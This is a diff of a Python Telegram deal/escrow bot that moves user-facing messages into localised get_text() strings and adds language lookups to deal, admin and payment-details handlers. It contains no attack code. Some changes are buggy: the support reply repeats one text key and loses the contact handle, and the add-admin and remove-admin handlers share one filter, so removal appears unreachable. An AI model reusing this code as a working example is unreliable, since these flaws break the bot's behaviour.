-    seller_lang = get_user_language(callback.from_user.id)
-    if seller_lang is None:
-        seller_lang = "ru"
-    text = f"{pm('✅')} {get_text(seller_lang, 'seller_confirmed')}!\n\n" \
-           f"{pm('📦')} {get_text(seller_lang, 'feature1')}: {deal['product']}\n" \
-           f"{pm('💰')} {get_text(seller_lang, 'enter_amount')}: {deal['amount']} {deal['currency']}\n" \
-           f"{pm('👤')} {get_text(seller_lang, 'our_channel')}: @{deal['buyer_username']}\n\n" \
-           f"{pm('⏳')} {get_text(seller_lang, 'awaiting_confirmation')}..."
+    text = f"{pm('✅')} {get_text(lang, 'seller_confirmed')}!\n\n" \
+           f"{pm('📦')} {get_text(lang, 'product')}: {deal['product']}\n" \
+           f"{pm('💰')} {get_text(lang, 'amount')}: {deal['amount']} {deal['currency']}\n" \
+           f"{pm('👤')} {get_text(lang, 'buyer')}: @{deal['buyer_username']}\n\n" \
+           f"{pm('⏳')} {get_text(lang, 'status_awaiting')}..."
     await safe_edit(callback, text)
 
-    active_keyboard = buyer_confirm_keyboard(deal_id)
+    active_keyboard = buyer_confirm_keyboard(deal_id, deal.get("buyer_id", 0))
     updated = False
 
     if deal.get("buyer_message_id") and deal.get("buyer_chat_id"):
@@ -1511,14 +1789,18 @@ async def seller_delivered(callback: types.CallbackQuery):
             print(f"Failed to update keyboard: {e}")
 
     if not updated:
+        buyer_lang = get_user_language(deal.get("buyer_id", 0))
+        if buyer_lang is None:
+            buyer_lang = "ru"
+        text = f"{pm('📦')} {get_text(buyer_lang, 'seller_delivered')} {get_text(buyer_lang, 'deal')} #{deal_id}!\n\n" \
+               f"{pm('📦')} {get_text(buyer_lang, 'product')}: {deal['product']}\n" \
+               f"{pm('💰')} {get_text(buyer_lang, 'amount')}: {deal['amount']} {deal['currency']}\n" \
+               f"{pm('👤')} {get_text(buyer_lang, 'seller')}: @{deal['seller_username']}\n\n" \
+               f"{pm('👍')} {get_text(buyer_lang, 'confirm_receipt')}:"
         try:
             await bot.send_message(
                 deal["buyer_username"],
-                f"{pm('📦')} SELLER DELIVERED PRODUCT FOR DEAL #{deal_id}!\n\n"
-                f"{pm('📦')} Product: {deal['product']}\n"
-                f"{pm('💰')} Amount: {deal['amount']} {deal['currency']}\n"
-                f"{pm('👤')} Seller: @{deal['seller_username']}\n\n"
-                f"{pm('👍')} CONFIRM RECEIPT:",
+                text,
                 reply_markup=active_keyboard
             )
         except:
@@ -1526,32 +1808,32 @@ async def seller_delivered(callback: types.CallbackQuery):
                 try:
                     await bot.send_message(
                         deal["buyer_id"],
-                        f"{pm('📦')} SELLER DELIVERED PRODUCT FOR DEAL #{deal_id}!\n\n"
-                        f"{pm('📦')} Product: {deal['product']}\n"
-                        f"{pm('💰')} Amount: {deal['amount']} {deal['currency']}\n"
-                        f"{pm('👤')} Seller: @{deal['seller_username']}\n\n"
-                        f"{pm('👍')} CONFIRM RECEIPT:",
+                        text,
                         reply_markup=active_keyboard
                     )
                 except Exception as e:
                     await callback.message.answer(
-                        f"{pm('❗️')} COULD NOT NOTIFY BUYER @{deal['buyer_username']}\n\n"
-                        f"Send them this link:\nhttps://t.me/{BOT_USERNAME}?start=deal_{deal_id}"
+                        f"{pm('❗️')} {get_text(lang, 'support_contact')} @{deal['buyer_username']}\n\n"
+                        f"{get_text(lang, 'deal_link_text')}:\nhttps://t.me/{BOT_USERNAME}?start=deal_{deal_id}"
                     )
 
-    await callback.answer(f"{pm('✅')} Seller confirmed product delivery")
+    await callback.answer(f"{pm('✅')} {get_text(lang, 'product_delivered')}")
 
 
 @dp.callback_query(lambda c: c.data.startswith("buyer_confirm_"))
 async def buyer_confirm_receipt(callback: types.CallbackQuery):
     deal_id = callback.data.split("_")[2]
+    lang = get_user_language(callback.from_user.id)
+    if lang is None:
+        lang = "ru"
+        
     if deal_id not in deals:
-        await callback.answer(f"{pm('❌')} DEAL NOT FOUND")
+        await callback.answer(f"{pm('❌')} {get_text(lang, 'deal_not_found')}")
         return
 
     deal = deals[deal_id]
     if deal["status"] != "awaiting_confirmation":
-        await callback.answer(f"{pm('❌')} SELLER HAS NOT CONFIRMED DELIVERY YET")
+        await callback.answer(f"{pm('❌')} {get_text(lang, 'status_waiting')}")
         return
 
     add_balance(deal["seller_id"], deal["currency"], deal["amount"])
@@ -1560,24 +1842,24 @@ async def buyer_confirm_receipt(callback: types.CallbackQuery):
     deal["completed_at"] = datetime.now().isoformat()
     save_deals(deals)
 
-    buyer_lang = get_user_language(callback.from_user.id)
-    if buyer_lang is None:
-        buyer_lang = "ru"
-    text = f"{pm('✅')} {get_text(buyer_lang, 'buyer_confirmed')}!\n\n" \
-           f"DEAL #{deal_id} {get_text(buyer_lang, 'completed')}.\n" \
-           f"{pm('🤝')} THANK YOU FOR YOUR TRUST!"
+    text = f"{pm('✅')} {get_text(lang, 'buyer_confirmed')}!\n\n" \
+           f"{get_text(lang, 'deal')} #{deal_id} {get_text(lang, 'status_completed')}.\n" \
+           f"{pm('🤝')} {get_text(lang, 'deal_completed_msg')}"
     await safe_edit(callback, text, reply_markup=back_to_main_button(callback.from_user.id))
 
     seller_lang = get_user_language(deal["seller_id"])
     if seller_lang is None:
         seller_lang = "ru"
+        
+    text = f"{pm('🎁')} {get_text(seller_lang, 'deal')} #{deal_id} {get_text(seller_lang, 'status_completed')}! {pm('🎁')}\n\n" \
+           f"{pm('💰')} {deal['amount']} {deal['currency']} {get_text(seller_lang, 'funds_added_to_balance')}.\n" \
+           f"{pm('📦')} {get_text(seller_lang, 'product')}: {deal['product']}\n" \
+           f"{pm('👤')} {get_text(seller_lang, 'buyer')}: @{deal['buyer_username']}\n\n" \
+           f"{pm('📊')} {get_text(seller_lang, 'my_balance')}"
+    
     await bot.send_message(
         deal["seller_id"],
-        f"{pm('🎁')} DEAL #{deal_id} {get_text(seller_lang, 'completed')}! {pm('🎁')}\n\n"
-        f"{pm('💰')} {deal['amount']} {deal['currency']} ADDED TO YOUR BALANCE.\n"
-        f"{pm('📦')} Product: {deal['product']}\n"
-        f"{pm('👤')} Buyer: @{deal['buyer_username']}\n\n"
-        f"{pm('📊')} CHECK BALANCE IN MAIN MENU."
+        text
     )
 
     await log_to_master(
@@ -1591,17 +1873,21 @@ async def buyer_confirm_receipt(callback: types.CallbackQuery):
 # ========== АДМИН-ПАНЕЛЬ ==========
 @dp.callback_query(lambda c: c.data == "withdraw_requests")
 async def show_withdraw_requests(callback: types.CallbackQuery):
+    lang = get_user_language(callback.from_user.id)
+    if lang is None:
+        lang = "ru"
+        
     if not is_admin(callback.from_user.id):
-        await callback.answer(f"{pm('❌')} ACCESS DENIED", show_alert=True)
+        await callback.answer(f"{pm('❌')} {get_text(lang, 'access_denied')}", show_alert=True)
         return
 
     pending = {rid: req for rid, req in withdraw_requests.items() if req["status"] == "pending"}
 
     if not pending:
-        text = f"{pm('📭')} NO ACTIVE WITHDRAWAL REQUESTS"
+        text = f"{pm('📭')} {get_text(lang, 'no_active_requests')}"
         await safe_edit(callback, text, reply_markup=back_to_main_button(callback.from_user.id))
     else:
-        text = f"{pm('💲')} WITHDRAWAL REQUESTS\n\n"
+        text = f"{pm('💲')} {get_text(lang, 'withdraw_funds')}\n\n"
         for rid, req in pending.items():
             text += f"#{rid} | {req['amount']} {req['currency']} | @{req['username']}\n"
             text += f"📝 {req['details'][:50]}\n"
@@ -1611,18 +1897,26 @@ async def show_withdraw_requests(callback: types.CallbackQuery):
 
 @dp.callback_query(lambda c: c.data == "change_photo")
 async def change_photo_prompt(callback: types.CallbackQuery, state: FSMContext):
+    lang = get_user_language(callback.from_user.id)
+    if lang is None:
+        lang = "ru"
+        
     if not is_admin(callback.from_user.id):
-        await callback.answer(f"{pm('❌')} ACCESS DENIED", show_alert=True)
+        await callback.answer(f"{pm('❌')} {get_text(lang, 'access_denied')}", show_alert=True)
         return
-    text = f"{pm('📷')} SEND NEW PHOTO FOR WELCOME MESSAGE.\nPHOTO MUST BE JPEG OR PNG."
+    text = f"{pm('📷')} {get_text(lang, 'send_photo')}"
     await safe_edit(callback, text)
     await state.set_state(PhotoStates.waiting_for_photo)
 
 
 @dp.message(PhotoStates.waiting_for_photo)
 async def save_photo_handler(message: types.Message, state: FSMContext):
+    lang = get_user_language(message.from_user.id)
+    if lang is None:
+        lang = "ru"
+        
     if not is_admin(message.from_user.id):
-        await message.answer(f"{pm('❌')} ACCESS DENIED")
+        await message.answer(f"{pm('❌')} {get_text(lang, 'access_denied')}")
         await state.clear()
         return
 
@@ -1630,32 +1924,39 @@ async def save_photo_handler(message: types.Message, state: FSMContext):
         file_id = message.photo[-1].file_id
         start_photo["file_id"] = file_id
         save_start_photo(start_photo)
-        await message.answer(f"{pm('✅')} WELCOME PHOTO UPDATED!",
+        await message.answer(f"{pm('✅')} {get_text(lang, 'photo_updated')}",
                              reply_markup=back_to_main_button(message.from_user.id))
         await log_to_master(f"🖼 Admin {message.from_user.full_name} changed start photo")
     else:
-        await message.answer(f"{pm('❌')} SEND A PHOTO, NOT OTHER FILE")
+        await message.answer(f"{pm('❌')} {get_text(lang, 'send_photo')}")
 
     await state.clear()
 
 
 @dp.callback_query(lambda c: c.data == "admin_add_balance")
 async def admin_add_balance_start(callback: types.CallbackQuery, state: FSMContext):
+    lang = get_user_language(callback.from_user.id)
+    if lang is None:
+        lang = "ru"
+        
     if not is_admin(callback.from_user.id):
-        await callback.answer(f"{pm('❌')} ACCESS DENIED", show_alert=True)
+        await callback.answer(f"{pm('❌')} {get_text(lang, 'access_denied')}", show_alert=True)
         return
     await state.set_state(AdminAddBalanceState.waiting_for_user_id)
-    text = f"{pm('💰')} ENTER TELEGRAM ID OF USER TO ADD BALANCE:\n\nTO FIND ID, USE @userinfobot"
+    text = f"{pm('💰')} {get_text(lang, 'enter_user_id')}"
     await safe_edit(callback, text)
 
 
 @dp.message(AdminAddBalanceState.waiting_for_user_id)
 async def admin_add_balance_user_id(message: types.Message, state: FSMContext):
+    lang = get_user_language(message.from_user.id)
+    if lang is None:
+        lang = "ru"
     try:
         user_id = int(message.text.strip())
         await state.update_data(target_user_id=user_id)
         await state.set_state(AdminAddBalanceState.waiting_for_currency)
-        await message.answer(f"{pm('💎')} SELECT CURRENCY:",
+        await message.answer(f"{pm('💎')} {get_text(lang, 'choose_currency')}:",
                              reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                                  [premium_button("TON", "admin_balance_TON", "💎")],
                                  [premium_button("STARS", "admin_balance_STARS", "⭐️")],
@@ -1663,20 +1964,26 @@ async def admin_add_balance_user_id(message: types.Message, state: FSMContext):
                                  [premium_button("UAH", "admin_balance_UAH", "🌐")]
                              ]))
     except ValueError:
-        await message.answer(f"{pm('❌')} ENTER NUMERIC USER ID")
+        await message.answer(f"{pm('❌')} {get_text(lang, 'invalid_amount')}")
 
 
 @dp.callback_query(lambda c: c.data.startswith("admin_balance_"))
 async def admin_add_balance_currency(callback: types.CallbackQuery, state: FSMContext):
+    lang = get_user_language(callback.from_user.id)
+    if lang is None:
+        lang = "ru"
     currency = callback.data.split("_")[2]
     await state.update_data(target_currency=currency)
     await state.set_state(AdminAddBalanceState.waiting_for_amount)
-    text = f"{pm('💰')} ENTER AMOUNT TO ADD IN {currency}:"
+    text = f"{pm('💰')} {get_text(lang, 'enter_amount')} {currency}:"
     await safe_edit(callback, text)
 
 
 @dp.message(AdminAddBalanceState.waiting_for_amount)
 async def admin_add_balance_amount(message: types.Message, state: FSMContext):
+    lang = get_user_language(message.from_user.id)
+    if lang is None:
+        lang = "ru"
     try:
         amount = float(message.text.strip())
         if amount <= 0:
@@ -1687,41 +1994,50 @@ async def admin_add_balance_amount(message: types.Message, state: FSMContext):
 
         add_balance(user_id, currency, amount)
 
-        await message.answer(f"{pm('✅')} ADDED {amount} {currency} TO USER (ID: {user_id})",
+        await message.answer(f"{pm('✅')} {get_text(lang, 'balance_added')} {amount} {currency}",
                              reply_markup=back_to_main_button(message.from_user.id))
         await log_to_master(
             f"💰 Admin @{message.from_user.username} added {amount} {currency} to user ID:{user_id}")
 
+        user_lang = get_user_language(user_id)
+        if user_lang is None:
+            user_lang = "ru"
         try:
             await bot.send_message(
                 user_id,
-                f"{pm('💰')} YOUR BALANCE HAS BEEN TOPPED UP!\n\n"
-                f"AMOUNT: {amount} {currency}\n\n"
-                f"CHECK BALANCE: MAIN MENU → MY BALANCE"
+                f"{pm('💰')} {get_text(user_lang, 'balance_topped_up')}!\n\n"
+                f"{get_text(user_lang, 'amount')}: {amount} {currency}"
             )
         except:
             pass
 
         await state.clear()
     except:
-        await message.answer(f"{pm('❌')} ENTER A POSITIVE NUMBER")
+        await message.answer(f"{pm('❌')} {get_text(lang, 'invalid_amount')}")
 
 
 @dp.callback_query(lambda c: c.data == "edit_rekvisits")
 async def edit_rekvisits_panel(callback: types.CallbackQuery):
+    lang = get_user_language(callback.from_user.id)
+    if lang is None:
+        lang = "ru"
+        
     if not is_admin(callback.from_user.id):
-        await callback.answer(f"{pm('❌')} ACCESS DENIED", show_alert=True)
+        await callback.answer(f"{pm('❌')} {get_text(lang, 'access_denied')}", show_alert=True)
         return
-    text = f"{pm('💳')} EDIT PAYMENT DETAILS\n\nSELECT CURRENCY TO EDIT:"
-    await safe_edit(callback, text, reply_markup=rekvisits_edit_keyboard())
+    text = f"{pm('💳')} {get_text(lang, 'edit_rekvisits_title')}"
+    await safe_edit(callback, text, reply_markup=rekvisits_edit_keyboard(callback.from_user.id))
 
 
 @dp.callback_query(lambda c: c.data == "edit_ton")
 async def edit_ton(callback: types.CallbackQuery, state: FSMContext):
+    lang = get_user_language(callback.from_user.id)
+    if lang is None:
+        lang = "ru"
     if not is_admin(callback.from_user.id):
-        await callback.answer(f"{pm('❌')} ACCESS DENIED", show_alert=True)
+        await callback.answer(f"{pm('❌')} {get_text(lang, 'access_denied')}", show_alert=True)
         return
-    text = f"{pm('✏️')} ENTER NEW TEXT FOR TON PAYMENT:\n\nUSE {{amount}} FOR AMOUNT PLACEHOLDER"
+    text = f"{pm('✏️')} {get_text(lang, 'enter_new_text')} TON:\n\n{get_text(lang, 'use_amount_placeholder')}"
     await safe_edit(callback, text)
     await state.update_data(rekv_type="ton")
     await state.set_state(RekvStates.waiting_for_rekv_text)
@@ -1729,10 +2045,13 @@ async def edit_ton(callback: types.CallbackQuery, state: FSMContext):
 
 @dp.callback_query(lambda c: c.data == "edit_stars")
 async def edit_stars(callback: types.CallbackQuery, state: FSMContext):
+    lang = get_user_language(callback.from_user.id)
+    if lang is None:
+        lang = "ru"
     if not is_admin(callback.from_user.id):
-        await callback.answer(f"{pm('❌')} ACCESS DENIED", show_alert=True)
+        await callback.answer(f"{pm('❌')} {get_text(lang, 'access_denied')}", show_alert=True)
         return
-    text = f"{pm('✏️')} ENTER NEW TEXT FOR STARS PAYMENT:\n\nUSE {{amount}} FOR AMOUNT PLACEHOLDER"
+    text = f"{pm('✏️')} {get_text(lang, 'enter_new_text')} STARS:\n\n{get_text(lang, 'use_amount_placeholder')}"
     await safe_edit(callback, text)
     await state.update_data(rekv_type="stars")
     await state.set_state(RekvStates.waiting_for_rekv_text)
@@ -1740,10 +2059,13 @@ async def edit_stars(callback: types.CallbackQuery, state: FSMContext):
 
 @dp.callback_query(lambda c: c.data == "edit_rub")
 async def edit_rub(callback: types.CallbackQuery, state: FSMContext):
+    lang = get_user_language(callback.from_user.id)
+    if lang is None:
+        lang = "ru"
     if not is_admin(callback.from_user.id):
-        await callback.answer(f"{pm('❌')} ACCESS DENIED", show_alert=True)
+        await callback.answer(f"{pm('❌')} {get_text(lang, 'access_denied')}", show_alert=True)
         return
-    text = f"{pm('✏️')} ENTER NEW TEXT FOR RUB PAYMENT:\n\nUSE {{amount}} FOR AMOUNT PLACEHOLDER"
+    text = f"{pm('✏️')} {get_text(lang, 'enter_new_text')} RUB:\n\n{get_text(lang, 'use_amount_placeholder')}"
     await safe_edit(callback, text)
     await state.update_data(rekv_type="rub")
     await state.set_state(RekvStates.waiting_for_rekv_text)
@@ -1751,10 +2073,13 @@ async def edit_rub(callback: types.CallbackQuery, state: FSMContext):
 
 @dp.callback_query(lambda c: c.data == "edit_uah")
 async def edit_uah(callback: types.CallbackQuery, state: FSMContext):
+    lang = get_user_language(callback.from_user.id)
+    if lang is None:
+        lang = "ru"
     if not is_admin(callback.from_user.id):
-        await callback.answer(f"{pm('❌')} ACCESS DENIED", show_alert=True)
+        await callback.answer(f"{pm('❌')} {get_text(lang, 'access_denied')}", show_alert=True)
         return
-    text = f"{pm('✏️')} ENTER NEW TEXT FOR UAH PAYMENT:\n\nUSE {{amount}} FOR AMOUNT PLACEHOLDER"
+    text = f"{pm('✏️')} {get_text(lang, 'enter_new_text')} UAH:\n\n{get_text(lang, 'use_amount_placeholder')}"
     await safe_edit(callback, text)
     await state.update_data(rekv_type="uah")
     await state.set_state(RekvStates.waiting_for_rekv_text)
@@ -1762,12 +2087,15 @@ async def edit_uah(callback: types.CallbackQuery, state: FSMContext):
 
 @dp.message(RekvStates.waiting_for_rekv_text)
 async def save_rekv_text(message: types.Message, state: FSMContext):
+    lang = get_user_language(message.from_user.id)
+    if lang is None:
+        lang = "ru"
     data = await state.get_data()
     rekv_type = data.get("rekv_type")
     if rekv_type:
         rekvisits[rekv_type] = message.text.strip()
         save_rekvisits(rekvisits)
-        await message.answer(f"{pm('✅')} PAYMENT DETAILS FOR {rekv_type.upper()} UPDATED!",
+        await message.answer(f"{pm('✅')} {get_text(lang, 'rekvisits_updated')} {rekv_type.upper()}",
                              reply_markup=back_to_main_button(message.from_user.id))
         await log_to_master(f"💳 Admin {message.from_user.full_name} changed details for {rekv_type.upper()}")
     await state.clear()
@@ -1775,76 +2103,98 @@ async def save_rekv_text(message: types.Message, state: FSMContext):
 
 @dp.callback_query(lambda c: c.data == "back_to_admin")
 async def back_to_admin(callback: types.CallbackQuery):
+    lang = get_user_language(callback.from_user.id)
+    if lang is None:
+        lang = "ru"
     if not is_admin(callback.from_user.id):
-        await callback.answer(f"{pm('❌')} ACCESS DENIED", show_alert=True)
+        await callback.answer(f"{pm('❌')} {get_text(lang, 'access_denied')}", show_alert=True)
         return
-    text = f"{pm('👑')} ADMIN PANEL\n\nSELECT ACTION:"
+    text = f"{pm('👑')} {get_text(lang, 'admin_panel')}\n\n{get_text(lang, 'choose_action')}:"
     await safe_edit(callback, text, reply_markup=admin_panel_keyboard(callback.from_user.id))
 
 
 @dp.callback_query(lambda c: c.data == "add_admin")
 async def add_admin_prompt(callback: types.CallbackQuery):
+    lang = get_user_language(callback.from_user.id)
+    if lang is None:
+        lang = "ru"
     if callback.from_user.id != MASTER_ADMIN_ID:
-        await callback.answer(f"{pm('❌')} MASTER ADMIN ONLY", show_alert=True)
+        await callback.answer(f"{pm('❌')} {get_text(lang, 'access_denied')}", show_alert=True)
         return
-    text = f"{pm('📝')} ENTER TELEGRAM ID OF USER TO ADD AS ADMIN:"
+    text = f"{pm('📝')} {get_text(lang, 'enter_user_id')}"
     await safe_edit(callback, text)
 
 
 @dp.message(lambda msg: msg.text and msg.text.isdigit() and msg.from_user.id == MASTER_ADMIN_ID)
 async def add_admin_process(message: types.Message):
+    lang = get_user_language(message.from_user.id)
+    if lang is None:
+        lang = "ru"
     user_id = int(message.text.strip())
     admins.add(user_id)
     save_admins(admins)
-    await message.answer(f"{pm('✅')} USER {user_id} IS NOW ADMIN!", reply_markup=back_to_main_button(message.from_user.id))
+    await message.answer(f"{pm('✅')} {get_text(lang, 'admin_added')} {user_id}",
+                         reply_markup=back_to_main_button(message.from_user.id))
     await log_to_master(f"👑 New admin added: {user_id}")
 
 
 @dp.callback_query(lambda c: c.data == "remove_admin")
 async def remove_admin_prompt(callback: types.CallbackQuery):
+    lang = get_user_language(callback.from_user.id)
+    if lang is None:
+        lang = "ru"
     if callback.from_user.id != MASTER_ADMIN_ID:
-        await callback.answer(f"{pm('❌')} MASTER ADMIN ONLY", show_alert=True)
+        await callback.answer(f"{pm('❌')} {get_text(lang, 'access_denied')}", show_alert=True)
         return
-    text = f"{pm('📝')} ENTER TELEGRAM ID OF USER TO REMOVE FROM ADMINS:"
+    text = f"{pm('📝')} {get_text(lang, 'enter_user_id')}"
     await safe_edit(callback, text)
 
 
 @dp.message(lambda msg: msg.text and msg.text.isdigit() and msg.from_user.id == MASTER_ADMIN_ID)
 async def remove_admin_process(message: types.Message):
+    lang = get_user_language(message.from_user.id)
+    if lang is None:
+        lang = "ru"
     user_id = int(message.text.strip())
     if user_id == MASTER_ADMIN_ID:
-        await message.answer(f"{pm('❌')} CANNOT REMOVE MASTER ADMIN")
+        await message.answer(f"{pm('❌')} {get_text(lang, 'cannot_remove_master')}")
         return
     if user_id in admins:
         admins.remove(user_id)
         save_admins(admins)
-        await message.answer(f"{pm('✅')} USER {user_id} IS NO LONGER ADMIN.",
+        await message.answer(f"{pm('✅')} {get_text(lang, 'admin_removed')} {user_id}",
                              reply_markup=back_to_main_button(message.from_user.id))
         await log_to_master(f"👑 Admin removed: {user_id}")
     else:
-        await message.answer(f"{pm('❌')} NOT FOUND")
+        await message.answer(f"{pm('❌')} {get_text(lang, 'user_not_found')}")
 
 
 @dp.callback_query(lambda c: c.data == "list_admins")
 async def list_admins_callback(callback: types.CallbackQuery):
+    lang = get_user_language(callback.from_user.id)
+    if lang is None:
+        lang = "ru"
     if not is_admin(callback.from_user.id):
-        await callback.answer(f"{pm('❌')} ACCESS DENIED", show_alert=True)
+        await callback.answer(f"{pm('❌')} {get_text(lang, 'access_denied')}", show_alert=True)
         return
     admin_list = "\n".join([f"• {aid}" for aid in admins])
-    text = f"{pm('📊')} ADMIN LIST:\n\n{admin_list}"
+    text = f"{pm('📊')} {get_text(lang, 'admin_list')}:\n\n{admin_list}"
     await safe_edit(callback, text, reply_markup=back_to_main_button(callback.from_user.id))
 
 
 @dp.callback_query(lambda c: c.data == "all_deals")
 async def all_deals_callback(callback: types.CallbackQuery):
+    lang = get_user_language(callback.from_user.id)
+    if lang is None:
+        lang = "ru"
     if not is_admin(callback.from_user.id):
-        await callback.answer(f"{pm('❌')} ACCESS DENIED", show_alert=True)
+        await callback.answer(f"{pm('❌')} {get_text(lang, 'access_denied')}", show_alert=True)
         return
     if not deals:
-        text = f"{pm('📭')} NO DEALS"
+        text = f"{pm('📭')} {get_text(lang, 'no_deals_total')}"
         await safe_edit(callback, text, reply_markup=back_to_main_button(callback.from_user.id))
     else:
-        text = f"{pm('📊')} ALL DEALS\n\n"
+        text = f"{pm('📊')} {get_text(lang, 'all_deals_title')}\n\n"
         for deal_id, deal in list(deals.items())[-20:]:
             status_emoji = {"waiting_payment": pm('⏳'), "paid": pm('✅'), "awaiting_confirmation": pm('📦'),
                             "completed": pm('🎁')}.get(deal['status'], pm('❓'))
@@ -1854,15 +2204,21 @@ async def all_deals_callback(callback: types.CallbackQuery):
 
 @dp.callback_query(lambda c: c.data == "noop")
 async def noop_callback(callback: types.CallbackQuery):
-    await callback.answer(f"{pm('⏳')} WAIT FOR SELLER TO DELIVER PRODUCT")
+    lang = get_user_language(callback.from_user.id)
+    if lang is None:
+        lang = "ru"
+    await callback.answer(f"{pm('⏳')} {get_text(lang, 'waiting_for_delivery')}")
 
 
 @dp.callback_query(lambda c: c.data.startswith("support_"))
 async def support_callback(callback: types.CallbackQuery):
     deal_id = callback.data.split("_")[1]
+    lang = get_user_language(callback.from_user.id)
+    if lang is None:
+        lang = "ru"
     await callback.answer()
     await callback.message.answer(
-        f"{pm('💬')} FOR DEAL #{deal_id} SUPPORT CONTACT:\n@tonkeeperdealssupbot"
+        f"{pm('💬')} {get_text(lang, 'support_contact')}: {get_text(lang, 'support_contact')}"
     )
 
 
@@ -1875,6 +2231,7 @@ async def main():
     print(f"{pm('💎')} SUPPORTED CURRENCIES: TON, STARS, RUB, UAH")
     print(f"{pm('🌐')} SUPPORTED LANGUAGES: Russian, English, Chinese, Arabic")
     print(f"{pm('✅')} PREMIUM EMOJIS LOADED")
+    print(f"{pm('🆘')} SUPPORT: {SUPPORT_LINK}")
     await dp.start_polling(bot)
 
 
